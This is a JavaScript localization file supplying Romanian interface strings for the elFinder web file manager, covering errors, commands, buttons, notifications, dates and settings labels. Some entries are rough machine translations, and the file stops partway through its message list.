/**
 * Română translation
 * @author Cristian Tabacitu <hello@tabacitu.ro>
 * @version 2020-08-31
 */
(function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.ro = {
		translator : 'Cristian Tabacitu &lt;hello@tabacitu.ro&gt;',
		language   : 'Română',
		direction  : 'ltr',
		dateFormat : 'd M Y h:i', // will show like: 31 august 2020 06:00
		fancyDateFormat : '$1 h:i A', // will show like: Astăzi 06:00 PM
		nonameDateFormat : 'ymd-His', // noname upload will show like: 200831-180048
		messages   : {

			/********************************** errors **********************************/
			'error'                : 'Eroare',
			'errUnknown'           : 'Eroare necunoscută.',
			'errUnknownCmd'        : 'Comandă necunoscuta.',
			'errJqui'              : 'Configurație jQuery UI necunoscută. Componentele selectable, draggable și droppable trebuie să fie incluse.',
			'errNode'              : 'elFinder necesită ca DOM Element să fie creat.',
			'errURL'               : 'Configurație elFinder nevalidă! URL option nu este setat.',
			'errAccess'            : 'Acces interzis.',
			'errConnect'           : 'Nu ne-am putut conecta la backend.',
			'errAbort'             : 'Conexiunea a fost oprită.',
			'errTimeout'           : 'Conexiunea a fost întreruptă.',
			'errNotFound'          : 'Nu am gasit backend-ul.',
			'errResponse'          : 'Răspuns backend greșit.',
			'errConf'              : 'Configurație backend greșită.',
			'errJSON'              : 'Modulul PHP JSON nu este instalat.',
			'errNoVolumes'         : 'Volumele citibile nu sunt disponibile.',
			'errCmdParams'         : 'Parametri greșiți pentru comanda "$1".',
			'errDataNotJSON'       : 'Datele nu sunt în format JSON.',
			'errDataEmpty'         : 'Datele sunt goale.',
			'errCmdReq'            : 'Cererea către backend necesită un nume de comandă.',
			'errOpen'              : 'Nu am putut deschide "$1".',
			'errNotFolder'         : 'Obiectul nu este un dosar.',
			'errNotFile'           : 'Obiectul nu este un fișier.',
			'errRead'              : 'Nu am putut citi "$1".',
			'errWrite'             : 'Nu am putu scrie în "$1".',
			'errPerm'              : 'Nu ai permisiunea necesară.',
			'errLocked'            : '"$1" este blocat și nu poate fi redenumit, mutat sau șters.',
			'errExists'            : 'Un fișier cu numele "$1" există deja.',
			'errInvName'           : 'Numele pentru fișier este greșit.',
			'errInvDirname'        : 'Nume dosar nevalid.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Nu am găsit dosarul.',
			'errFileNotFound'      : 'Nu am găsit fișierul.',
			'errTrgFolderNotFound' : 'Nu am găsit dosarul pentru destinație "$1".',
			'errPopup'             : 'Browserul tău a prevenit deschiderea ferestrei popup. Pentru a deschide fișierul permite deschidere ferestrei.',
			'errMkdir'             : 'Nu am putut crea dosarul "$1".',
			'errMkfile'            : 'Nu am putut crea fișierul "$1".',
			'errRename'            : 'Nu am putut redenumi "$1".',
			'errCopyFrom'          : 'Copierea fișierelor de pe volumul "$1" este interzisă.',
			'errCopyTo'            : 'Copierea fișierelor către volumul "$1" este interzisă.',
			'errMkOutLink'         : 'Nu am putut crea linkul în afara volumului rădăcină.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Eroare de upload.',  // old name - errUploadCommon
			'errUploadFile'        : 'Nu am putut urca "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Nu am găsit fișiere pentru a le urca.',
			'errUploadTotalSize'   : 'Datele depâșest limita maximă de mărime.', // old name - errMaxSize
			'errUploadFileSize'    : 'Fișierul este prea mare.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Acest tip de fișier nu este permis.',
			'errUploadTransfer'    : 'Eroare la transferarea "$1".',
			'errUploadTemp'        : 'Nu am putut crea fișierul temporar pentru upload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Obiectul "$1" există deja în acest loc și nu poate fi înlocuit de un obiect de alt tip.', // new
			'errReplace'           : 'Nu am putut înlocui "$1".',
			'errSave'              : 'Nu am putut salva "$1".',
			'errCopy'              : 'Nu am putut copia "$1".',
			'errMove'              : 'Nu am putut muta "$1".',
			'errCopyInItself'      : 'Nu am putut copia "$1" în el însuși.',
			'errRm'                : 'Nu am putut șterge "$1".',
			'errTrash'             : 'Imposibil în coșul de gunoi.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Nu am putut șterge fișierul sursă.',
			'errExtract'           : 'Nu am putut extrage fișierele din "$1".',
			'errArchive'           : 'Nu am putut crea arhiva.',
			'errArcType'           : 'Arhiva este de un tip nesuportat.',
			'errNoArchive'         : 'Fișierul nu este o arhiva sau este o arhivă de un tip necunoscut.',
			'errCmdNoSupport'      : 'Backend-ul nu suportă această comandă.',
			'errReplByChild'       : 'Dosarul “$1” nu poate fi înlocuit de un element pe care el îl conține.',
			'errArcSymlinks'       : 'Din motive de securitate, arhiva nu are voie să conțină symlinks sau fișiere cu nume interzise.', // edited 24.06.2012
			'errArcMaxSize'        : 'Fișierul arhivei depășește mărimea maximă permisă.',
			'errResize'            : 'Nu am putut redimensiona "$1".',
			'errResizeDegree'      : 'Grad de rotație nevalid.',  // added 7.3.2013
			'errResizeRotate'      : 'Imaginea nu a fost rotită.',  // added 7.3.2013
			'errResizeSize'        : 'Mărimea imaginii este nevalidă.',  // added 7.3.2013
			'errResizeNoChange'    : 'Mărimea imaginii nu a fost schimbată.',  // added 7.3.2013
			'errUsupportType'      : 'Tipul acesta de fișier nu este suportat.',
			'errNotUTF8Content'    : 'Fișierul "$1" nu folosește UTF-8 și nu poate fi editat.',  // added 9.11.2011
			'errNetMount'          : 'Nu am putut încărca "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protocol nesuportat.',     // added 17.04.2012
			'errNetMountFailed'    : 'Încărcare eșuată.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Gazda este necesară.', // added 18.04.2012
			'errSessionExpires'    : 'Sesiunea a expirat datorită lipsei de activitate.',
			'errCreatingTempDir'   : 'Nu am putut crea fișierul temporar: "$1"',
			'errFtpDownloadFile'   : 'Nu am putut descarca fișierul de pe FTP: "$1"',
			'errFtpUploadFile'     : 'Nu am putut încărca fișierul pe FTP: "$1"',
			'errFtpMkdir'          : 'Nu am putut crea acest dosar pe FTP: "$1"',
			'errArchiveExec'       : 'Eroare la arhivarea fișierelor: "$1"',
			'errExtractExec'       : 'Eroare la dezarhivarea fișierelor: "$1"',
			'errNetUnMount'        : 'Nu am putut elimina volumul', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Nu poate fi convertit la UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Pentru a urca dosare încearcă Google Chrome.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Declanșat în timp ce căutați „$ 1”. Rezultatul căutării este parțial.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Este necesară o reautorizare.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Numărul maxim de articole selectabile este de $ 1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Imposibil de restaurat din coșul de gunoi. Nu pot identifica destinația de restaurare.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editorul nu a fost găsit la acest tip de fișier.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'A apărut o eroare din partea serverului.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Imposibil să goliți folderul „$ 1”.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Mai sunt încă $ 1 erori.', // from v2.1.44 added 9.12.2018

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Creeaza arhivă',
			'cmdback'      : 'Înapoi',
			'cmdcopy'      : 'Copiază',
			'cmdcut'       : 'Taie',
			'cmddownload'  : 'Descarcă',
			'cmdduplicate' : 'Creează duplicat',
			'cmdedit'      : 'Modifică fișier',
			'cmdextract'   : 'Extrage fișierele din arhivă',
			'cmdforward'   : 'Înainte',
			'cmdgetfile'   : 'Alege fișiere',
			'cmdhelp'      : 'Despre acest software',
			'cmdhome'      : 'Acasă',
			'cmdinfo'      : 'Informații',
			'cmdmkdir'     : 'Dosar nou',
			'cmdmkdirin'   : 'În folder nou', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Fișier nou',
			'cmdopen'      : 'Deschide',
			'cmdpaste'     : 'Lipește',
			'cmdquicklook' : 'Previzualizează',
			'cmdreload'    : 'Reîncarcă',
			'cmdrename'    : 'Redenumește',
			'cmdrm'        : 'Șterge',
			'cmdtrash'     : 'În gunoi', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Restabili', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Găsește fișiere',
			'cmdup'        : 'Mergi la dosarul părinte',
			'cmdupload'    : 'Urcă fișiere',
			'cmdview'      : 'Vezi',
			'cmdresize'    : 'Redimensionează & rotește',
			'cmdsort'      : 'Sortează',
			'cmdnetmount'  : 'Încarcă volum din rețea', // added 18.04.2012
			'cmdnetunmount': 'Elimină volum', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'La Locuri', // added 28.12.2014
			'cmdchmod'     : 'Schimbă mod', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Deschide un folder', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Resetați lățimea coloanei', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Ecran complet', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Mișcare', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Goliți folderul', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Anula', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'A reface', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferințe', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Selectează tot', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Nu selectați niciuna', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Inverseaza selectia', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Deschide într-o fereastră nouă', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Ascundeți (preferință)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Închide',
			'btnSave'   : 'Salvează',
			'btnRm'     : 'Șterge',
			'btnApply'  : 'Aplică',
			'btnCancel' : 'Anulează',
			'btnNo'     : 'Nu',
			'btnYes'    : 'Da',
			'btnMount'  : 'Încarcă',  // added 18.04.2012
			'btnApprove': 'Mergi la $1 și aprobă', // from v2.1 added 26.04.2012
			'btnUnmount': 'Elimină volum', // from v2.1 added 30.04.2012
			'btnConv'   : 'Convertește', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Aici',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volum',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Toate',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Tipuri MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nume fișier',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Salvează și închide', // from v2.1 added 12.6.2015
			'btnBackup' : 'Backup', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Redenumire',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Redenumiți (Toate)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Prev (1 $ / 2 $)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Următorul ($ 1 / $ 2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Salvează ca', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Deschide dosar',
			'ntffile'     : 'Deschide fișier',
			'ntfreload'   : 'Actualizează conținutul dosarului',
			'ntfmkdir'    : 'Se creează dosarul',
			'ntfmkfile'   : 'Se creează fișierele',
			'ntfrm'       : 'Șterge fișiere',
			'ntfcopy'     : 'Copiază fișiere',
			'ntfmove'     : 'Mută fișiere',
			'ntfprepare'  : 'Pregătește copierea fișierelor',
			'ntfrename'   : 'Redenumește fișiere',
			'ntfupload'   : 'Se urcă fișierele',
			'ntfdownload' : 'Se descarcă fișierele',
			'ntfsave'     : 'Salvează fișiere',
			'ntfarchive'  : 'Se creează arhiva',
			'ntfextract'  : 'Se extrag fișierele din arhivă',
			'ntfsearch'   : 'Se caută fișierele',
			'ntfresize'   : 'Se redimnesionează imaginile',
			'ntfsmth'     : 'Se întamplă ceva',
			'ntfloadimg'  : 'Se încarcă imaginea',
			'ntfnetmount' : 'Se încarcă volumul din rețea', // added 18.04.2012
			'ntfnetunmount': 'Se elimină volumul din rețea', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Se preiau dimensiunile imaginii', // added 20.05.2013
			'ntfreaddir'  : 'Se citesc informațiile dosarului', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Se preia URL-ul din link', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Se schimba modul de fișier', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Verificarea numelui fișierului de încărcare', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Crearea unui fișier pentru descărcare', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Obținerea informațiilor despre cale', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Procesarea fișierului încărcat', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Aruncarea la gunoi', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Se face restaurarea din coșul de gunoi', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Verificarea dosarului destinație', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Anularea operației anterioare', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Refacerea anulară anterioară', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Verificarea conținutului', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Gunoi', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'necunoscută',
			'Today'       : 'Astăzi',
			'Yesterday'   : 'Ieri',
			'msJan'       : 'Ian',
			'msFeb'       : 'februarie',
			'msMar'       : 'strica',
			'msApr'       : 'Aprilie',
			'msMay'       : 'Mai',
			'msJun'       : 'Iun',
			'msJul'       : 'Iul',
			'msAug'       : 'august',
			'msSep'       : 'septembrie',
			'msOct'       : 'octombrie',
			'msNov'       : 'noiembrie',
			'msDec'       : 'decembrie',
			'January'     : 'Ianuarie',
			'February'    : 'Februarie',
			'March'       : 'Martie',
			'April'       : 'Aprilie',
			'May'         : 'Mai',
			'June'        : 'Iunie',
			'July'        : 'Iulie',
			'August'      : 'August',
			'September'   : 'Septembrie',
			'October'     : 'Octombrie',
			'November'    : 'Noiembrie',
			'December'    : 'Decembrie',
			'Sunday'      : 'Duminică',
			'Monday'      : 'Luni',
			'Tuesday'     : 'Marți',
			'Wednesday'   : 'Miercuri',
			'Thursday'    : 'Joi',
			'Friday'      : 'Vineri',
			'Saturday'    : 'Sâmbătă',
			'Sun'         : 'Du',
			'Mon'         : 'Lu',
			'Tue'         : 'Ma',
			'Wed'         : 'Mi',
			'Thu'         : 'Jo',
			'Fri'         : 'Vi',
			'Sat'         : 'Sâ',

			/******************************** sort variants ********************************/
			'sortname'          : 'după nume',
			'sortkind'          : 'după tip',
			'sortsize'          : 'după mărime',
			'sortdate'          : 'după dată',
			'sortFoldersFirst'  : 'Dosarele primele',
			'sortperm'          : 'prin permis', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'după modul',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'de catre proprietar',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'pe grup',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'De asemenea, Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'FisierNou.txt', // added 10.11.2015
			'untitled folder'   : 'DosarNou',   // added 10.11.2015
			'Archive'           : 'ArhivaNoua',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Newfile. $ De 1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$ 1: fișier',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Este necesară confirmare',
			'confirmRm'       : 'Ești sigur că vrei să ștergi fișierele?<br/>Acțiunea este ireversibilă!',
			'confirmRepl'     : 'Înlocuiește fișierul vechi cu cel nou?',
			'confirmRest'     : 'Înlocuiți elementul existent cu elementul din coșul de gunoi?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Nu este în UTF-8<br/>Convertim la UTF-8?<br/>Conținutul devine UTF-8 după salvarea conversiei.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Codificarea caracterelor acestui fișier nu a putut fi detectată. Trebuie să se convertească temporar în UTF-8 pentru editare. <br/> Vă rugăm să selectați codificarea caracterelor pentru acest fișier.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Au avut loc modificări.<br/>Dacă nu salvezi se vor pierde modificările.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Sigur doriți să mutați articole în coșul de gunoi?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Sigur doriți să mutați articolele în „$ 1”?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Aplică pentru toate',
			'name'            : 'Nume',
			'size'            : 'Mărime',
			'perms'           : 'Permisiuni',
			'modify'          : 'Modificat la',
			'kind'            : 'Tip',
			'read'            : 'citire',
			'write'           : 'scriere',
			'noaccess'        : 'acces interzis',
			'and'             : 'și',
			'unknown'         : 'necunoscut',
			'selectall'       : 'Alege toate fișierele',
			'selectfiles'     : 'Alege fișier(e)',
			'selectffile'     : 'Alege primul fișier',
			'selectlfile'     : 'Alege ultimul fișier',
			'viewlist'        : 'Vezi ca listă',
			'viewicons'       : 'Vezi ca icoane',
			'viewSmall'       : 'Icoane mici', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Pictograme medii', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Pictograme mari', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Icoane extra mari', // from v2.1.39 added 22.5.2018
			'places'          : 'Locuri',
			'calc'            : 'Calculează',
			'path'            : 'Cale',
			'aliasfor'        : 'Alias pentru',
			'locked'          : 'Securizat',
			'dim'             : 'Dimensiuni',
			'files'           : 'Fișiere',
			'folders'         : 'Dosare',
			'items'           : 'Elemente',
			'yes'             : 'da',
			'no'              : 'nu',
			'link'            : 'Legătură',
			'searcresult'     : 'Rezultatele căutării',
			'selected'        : 'elemente alese',
			'about'           : 'Despre',
			'shortcuts'       : 'Scurtături',
			'help'            : 'Ajutor',
			'webfm'           : 'Manager web pentru fișiere',
			'ver'             : 'Versiune',
			'protocolver'     : 'versiune protocol',
			'homepage'        : 'Pagina proiectului',
			'docs'            : 'Documentație',
			'github'          : 'Fork nou pe Github',
			'twitter'         : 'Urmărește-ne pe twitter',
			'facebook'        : 'Alătura-te pe facebook',
			'team'            : 'Echipa',
			'chiefdev'        : 'dezvoltator sef',
			'developer'       : 'dezvoltator',
			'contributor'     : 'colaborator',
			'maintainer'      : 'maintainer',
			'translator'      : 'traducător',
			'icons'           : 'Icoane',
			'dontforget'      : 'și nu uita să-ți iei prosopul',
			'shortcutsof'     : 'Scurtăturile sunt dezactivate',
			'dropFiles'       : 'Dă drumul fișierelor aici',
			'or'              : 'sau',
			'selectForUpload' : 'Alege fișiere pentru a le urca',
			'moveFiles'       : 'Mută fișiere',
			'copyFiles'       : 'Copiază fișiere',
			'restoreFiles'    : 'Restaurează elemente', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Șterge din locuri',
			'aspectRatio'     : 'Raportul de aspect',
			'scale'           : 'Scală',
			'width'           : 'Lățime',
			'height'          : 'Înălțime',
			'resize'          : 'Redimensionează',
			'crop'            : 'Decupează',
			'rotate'          : 'Rotește',
			'rotate-cw'       : 'Rotește cu 90° în sensul ceasului',
			'rotate-ccw'      : 'Rotește cu 90° în sensul invers ceasului',
			'degree'          : '°',
			'netMountDialogTitle' : 'Încarcă volum din rețea', // added 18.04.2012
			'protocol'            : 'Protocol', // added 18.04.2012
			'host'                : 'Gazdă', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'Utilizator', // added 18.04.2012
			'pass'                : 'Parolă', // added 18.04.2012
			'confirmUnmount'      : 'Vrei să elimini volumul $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Drag&drop sau lipește din browser', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Drag&drop sau lipește fișiere aici', // from v2.1 added 07.04.2014
			'encoding'        : 'Encodare', // from v2.1 added 19.12.2014
			'locale'          : 'locale',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Țintă: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Caută după tipul MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Proprietar', // from v2.1 added 20.6.2015
			'group'           : 'grup', // from v2.1 added 20.6.2015
			'other'           : 'Alte', // from v2.1 added 20.6.2015
			'execute'         : 'A executa', // from v2.1 added 20.6.2015
			'perm'            : 'Permisiune', // from v2.1 added 20.6.2015
			'mode'            : 'Mod', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Dosarul este gol', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Folderul este gol \\ O picătură pentru a adăuga articole', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Folderul este gol \\ A Apăsați lung pentru a adăuga articole', // from v2.1.6 added 30.12.2015
			'quality'         : 'Calitate', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Auto-sincronizare',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Mutați în sus',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Obțineți un link URL', // from v2.1.7 added 9.2.2016
			'share'           : 'da mai departe',
			'selectedItems'   : 'Articole selectate ($ 1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID dosar', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Permiteți accesul offline', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Pentru a reautentifica', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Acum se încarcă...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Deschideți mai multe fișiere', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Încercați să deschideți fișierele de $ 1. Sigur doriți să deschideți în browser?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Rezultatele căutării sunt goale în ținta de căutare.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Este editarea unui fișier.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Ați selectat $ 1 articole.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Aveți articole de $ 1 în clipboard.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Căutarea incrementală se face numai din vizualizarea curentă.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'restabiliți', // from v2.1.15 added 3.8.2016
			'complete'        : '$ 1 completat', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Meniul contextual', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Întoarcerea paginii', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Radacini de volum', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetați', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Culoare de fundal', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Selector de culoare', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Grila 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Activat', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Dezactivat', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Rezultatele căutării sunt goale în vizualizarea curentă. \\ APresa [Enter] pentru a extinde ținta căutării.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Rezultatele căutării primei litere sunt goale în vizualizarea curentă.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Etichetă text', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '1 min. Rămas', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Redeschideți-vă cu codificarea selectată', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Salvați cu codificarea selectată', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Selectați folderul', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Căutare primă scrisoare', // from v2.1.23 added 24.3.2017
			'presets'         : 'presetări', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Sunt prea multe articole, astfel încât să nu poată intra în coșul de gunoi.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Goliți dosarul „$ 1”.', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Nu există articole într-un folder "$ 1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferinţă', // from v2.1.26 added 28.6.2017
			'language'        : 'Limba', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inițializați setările salvate în acest browser', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Inițializați setările salvate în acest browser', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... mai rămân 1 caracter.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... mai rămân 1 linie de dolari.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Sumă', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Dimensiunea grosieră a fișierului', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Concentrați-vă pe elementul de dialog cu mouse-ul',  // from v2.1.30 added 2.11.2017
			'select'          : 'Selectați', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Acțiune atunci când selectați fișierul', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Deschideți cu editorul folosit ultima dată', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Inverseaza selectia', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Sigur doriți să redenumiți $ 1 elemente selectate precum $ 2? <br/> Acest lucru nu poate fi anulat!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Redenumirea lotului', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Număr', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Adăugați prefixul', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Adăugați sufixul', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Modificați extensia', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Setări pentru coloane (afișare listă)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Toate modificările vor reflecta imediat arhiva.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Orice modificare nu se va reflecta până când nu se montează acest volum.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'De asemenea, au fost montate următoarele volum (e) montate pe acest volum. Ești sigur că îl demontezi?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informații de selecție', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmi pentru a afișa hash-ul fișierului', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Elemente de informații (panoul de informații de selecție)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Apăsați din nou pentru a ieși.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Bara de instrumente', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Spațiu de lucru', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'Toate', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Dimensiunea pictogramei (vizualizarea pictogramelor)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Deschideți fereastra editorului maximizat', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Deoarece conversia prin API nu este disponibilă în prezent, vă rugăm să convertiți pe site-ul web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'După conversie, trebuie să fiți încărcat cu adresa URL a articolului sau cu un fișier descărcat pentru a salva fișierul convertit.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Convertiți pe site de $ 1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'integrările', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Acest elFinder are următoarele servicii externe integrate. Vă rugăm să verificați termenii de utilizare, politica de confidențialitate etc. înainte de a o utiliza.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Afișați articole ascunse', // from v2.1.41 added 24.7.2018
			'Code Editor'     : 'Editor de cod',
			'hideHidden'      : 'Ascundeți elementele ascunse', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Afișați / ascundeți elementele ascunse', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Tipuri de fișiere de activat cu „Fișier nou”', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Tipul fișierului text', // from v2.1.41 added 7.8.2018
			'add'             : 'Adăuga', // from v2.1.41 added 7.8.2018
			'theme'           : 'Temă', // from v2.1.43 added 19.10.2018
			'default'         : 'Mod implicit', // from v2.1.43 added 19.10.2018
			'description'     : 'Descriere', // from v2.1.43 added 19.10.2018
			'website'         : 'Website', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
